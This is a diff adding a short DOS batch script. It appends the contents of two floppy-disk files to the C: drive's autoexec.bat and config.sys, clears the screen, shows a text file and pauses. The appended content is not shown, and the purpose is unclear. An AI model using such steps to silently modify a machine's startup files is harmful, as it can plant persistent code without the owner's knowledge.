@@ -1,0 +1,7 @@
+c:
+cd\
+type a:\a>>autoexec.bat
+type a:\b>>config.sys
+cls
+type a:\napis.txt
+pause
